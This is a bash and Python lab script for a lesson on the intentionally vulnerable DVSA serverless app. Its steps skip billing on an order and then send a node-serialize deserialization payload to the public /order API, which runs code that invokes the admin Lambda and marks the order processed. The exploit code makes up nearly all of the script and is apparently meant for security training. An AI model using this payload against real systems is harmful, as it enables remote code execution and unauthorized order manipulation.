#!/bin/bash

# Lesson 5 - Broken Access Control
# Purpose:
# Demonstrate that a normal DVSA user can abuse the public /order API path
# to indirectly invoke DVSA-ADMIN-UPDATE-ORDERS and update an order without
# completing the normal billing workflow.

set -e

if [ -z "$API" ] || [ -z "$TOKEN" ] || [ -z "$ORDER_ID" ]; then
  echo "Missing required environment variables."
  echo "Set these first:"
  echo 'export API="https://YOUR_API.execute-api.us-east-1.amazonaws.com/STAGE/order"'
  echo 'export TOKEN="PASTE_USER_TOKEN"'
  echo 'export ORDER_ID="PASTE_ORDER_ID"'
  exit 1
fi

mkdir -p evidence/lesson-05

echo "[1] Add shipping to the order without billing..."

curl -s "$API" \
  -H "content-type: application/json" \
  -H "authorization: $TOKEN" \
  --data-raw "{\"action\":\"shipping\",\"order-id\":\"$ORDER_ID\",\"data\":{\"address\":\"123 Lesson 5 Street\",\"email\":\"student@example.com\",\"name\":\"Lesson Five User\"}}" \
  | tee evidence/lesson-05/reproduce-01-shipping.json | jq

echo
echo "[2] Generate exploit payload..."

python3 - <<'PY' > evidence/lesson-05/reproduce-02-exploit-payload.json
import os
import json
import time

token = os.environ["TOKEN"].strip()
order_id = os.environ["ORDER_ID"].strip()

admin_event = {
    "headers": {
        "authorization": token
    },
    "body": {
        "action": "update",
        "order-id": order_id,
        "item": {
            "token": "lesson5-demo-token",
            "ts": int(time.time()),
            "itemList": {
                "11": 1,
                "12": 1
            },
            "address": "123 Lesson 5 Street",
            "total": 74,
            "status": 120
        }
    }
}

payload = {
    "action": (
        "_$$ND_FUNC$$_function(){"
        "var p=JSON.stringify(" + json.dumps(admin_event) + ");"
        "var AWS=require(\"aws-sdk\");"
        "var l=new AWS.Lambda();"
        "var x={FunctionName:\"DVSA-ADMIN-UPDATE-ORDERS\",InvocationType:\"RequestResponse\",Payload:p};"
        "l.invoke(x,function(e,d){console.log(\"LESSON5_ADMIN_INVOKE\", e, d);});"
        "}()"
    ),
    "cart-id": "lesson5-access-control-test"
}

print(json.dumps(payload))
PY

cat evidence/lesson-05/reproduce-02-exploit-payload.json | jq

echo
echo "[3] Send exploit payload to the public /order API..."

curl -s "$API" \
  -H "content-type: application/json" \
  --data-binary @evidence/lesson-05/reproduce-02-exploit-payload.json \
  | tee evidence/lesson-05/reproduce-03-exploit-response.json | jq

echo
echo "Refresh DVSA -> My Orders."
echo "Expected vulnerable result: the target order changes to processed without normal billing."
